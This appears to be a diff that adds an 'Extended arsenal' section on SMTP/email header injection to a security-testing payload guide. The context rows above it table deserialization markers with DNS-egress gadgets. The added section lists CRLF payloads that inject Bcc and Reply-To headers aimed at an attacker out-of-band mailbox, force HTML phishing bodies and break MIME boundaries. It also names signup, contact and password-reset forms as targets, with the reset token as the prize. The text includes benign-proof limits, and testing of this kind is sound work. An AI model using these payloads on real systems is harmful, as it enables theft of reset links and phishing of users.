@@ -607,3 +607,40 @@ unsafe loader). Report High only with exec evidence; else "deserialization of un
 | Python YAML | `!!python/` tag | `apply:socket.gethostbyname` | object/new / apply | Cfg (Full/Unsafe loader) |
 | Ruby Marshal | `\x04\x08` / `BAg` | egress on load | Gem:: universal chain | Self (stock interpreter) |
 | Node func-revival | `_$$ND_FUNC$$_`/`__js_function` | DNS-lookup IIFE | IIFE / proto-pollution | Self / Cfg (pollution sink) |
+
+---
+## Extended arsenal — SMTP / email header injection
+
+# When a user-controlled value (From / Subject / Name / email) is concatenated into a generated email WITHOUT
+# stripping CR/LF, injected `\r\n` splits the header block and lets you add or override headers — or break into
+# the body. The benign proof is an attacker-added `Bcc:` to a mailbox YOU control (receive a copy of outbound
+# mail) or an overridden `Reply-To`; never spoof mail to third parties. Keep volume to a single confirming send.
+
+### Payloads (land in a user-controlled From / Subject / Name / email field)
+```
+victim@t.example%0aBcc:attacker@TOKEN.oob.example                      # LF only — common where the app pre-strips CR
+victim@t.example%0d%0aBcc:attacker@TOKEN.oob.example                   # full CRLF
+victim@t.example%0aReply-To:attacker@TOKEN.oob.example                 # redirect replies to the attacker
+victim@t.example%0aContent-Type:text/html%0d%0a%0d%0a<h1>phish</h1>    # force an HTML body (blank line ends headers)
+victim@t.example%0aSubject:Overwritten                                 # override a server-set header
+"name\r\nBcc: attacker@TOKEN.oob.example"                              # raw CRLF where a quoted display-name is parsed
+```
+- **BCC exfil (primary benign proof):** inject `%0aBcc:<your-mailbox>` → you receive a COPY of the outbound mail.
+  High-value when the mail carries a secret: password-reset link / token, invoice, invite, or a magic-link login.
+- **Reply-To spoof:** victim replies land in the attacker's mailbox (phishing-friendly, no body change needed).
+- **Injected `Content-Type: text/html`** (then a blank line) → the mail renders attacker HTML = in-mail phish.
+- **MIME-boundary break:** inject a boundary delimiter / extra `Content-Type: multipart/...` to split the MIME
+  tree and attach arbitrary content past the template's intended parts.
+
+### Where to test (anywhere a name/email is echoed into a generated email)
+# - account **signup** (welcome / verification mail) · **"Contact Us"** / feedback form · **"Invite a friend"** /
+#   team-invite · **password reset** (the reset link itself is the prize) · newsletter subscribe · order/invoice email.
+# Procedure: submit the payload in the field, then CHECK the attacker mailbox for the copy / the altered header.
+
+### Encoding & confirmation notes
+- Carrier matters: a header value reflected into an email uses `%0d%0a` on the wire; a JSON/form field may need the
+  raw bytes or `\r\n` depending on how the app decodes it — try LF-only first (many apps strip CR but not LF).
+- Benign-proof = the attacker-controlled `Bcc`/`Reply-To` actually took effect (copy received / reply redirected),
+  with the recipient under test and secrets redacted. No mail to uninvolved third parties; one confirming send.
+- This is a CRLF-into-SMTP sink — de-dupe with the HTTP CRLF / `parameter-pollution` surface; the finding here is
+  the EMAIL header manipulation + its impact (secret-mail exfil / phish), not a generic header split.
